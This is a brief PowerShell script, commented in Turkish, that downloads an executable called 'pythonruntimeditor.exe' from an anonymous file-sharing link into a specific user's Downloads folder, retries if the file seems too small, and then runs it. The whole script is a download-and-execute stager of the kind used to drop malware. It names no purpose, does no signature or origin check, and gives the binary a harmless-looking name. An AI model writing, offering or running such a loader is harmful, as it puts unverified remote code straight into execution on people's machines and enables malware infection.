# WebClient ile dosya indir
$exeUrl = "https://store10.gofile.io/download/web/f251cd75-0191-4927-9a7b-2035446b5c3d/pythonruntimeditor.exe"
$localPath = "C:\Users\dogud\Downloads\pythonruntimeditor.exe"

# WebClient ile dosya indir
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($exeUrl, $localPath)

# İndirilen dosya kontrolü
$fileSize = (Get-Item $localPath).length
$expectedSize = 46000  # 46 KB'lik dosya için

if ($fileSize -lt $expectedSize) {
    Write-Host "Dosya boyutu hatalı. Yeniden indiriyorum..."
    Remove-Item $localPath -Force
    $webClient.DownloadFile($exeUrl, $localPath)
}

# Dosyayı çalıştır
Start-Process -FilePath $localPath -WindowStyle Normal
